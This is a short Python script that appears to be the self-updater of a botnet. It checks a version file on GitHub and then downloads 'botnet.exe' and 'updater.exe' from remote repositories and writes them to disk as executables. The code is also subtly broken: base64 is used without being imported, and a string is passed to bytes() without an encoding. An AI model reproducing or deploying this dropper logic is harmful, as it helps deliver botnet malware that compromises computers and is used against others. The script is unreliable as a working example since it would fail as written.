import requests

latest_version = '0.0.1'



def check_for_update():
	r = requests.get(f'https://api.github.com/repos/indrajith69/server_address/contents/version_info.txt?ref=master')
	req=bytes(r.json()['content'],encoding='utf-8')
	github_version = base64.decodebytes(req).decode('utf8')

	if latest_version!=github_version:
		return True
	return False


def update(botnet,updater):
	if check_for_update():
		bd = requests.get(f'https://api.github.com/repos/indrajith69/botnet/contents/{botnet}')
		ud = requests.get(f'https://api.github.com/repos/indrajith69/server_address/contents/{updater}?ref=master')

		botnet_data  = base64.decodebytes(bytes(bd.json()['content']))
		updater_data = base64.decodebytes(bytes(ud.json()['content']))

		with open('botnet.exe','wb') as f:
			f.write(botnet_data)

		with open('updater.exe','wb') as g:
			g.write(updater_data)

	else:
		pass




update('botnet.exe','updater.exe')
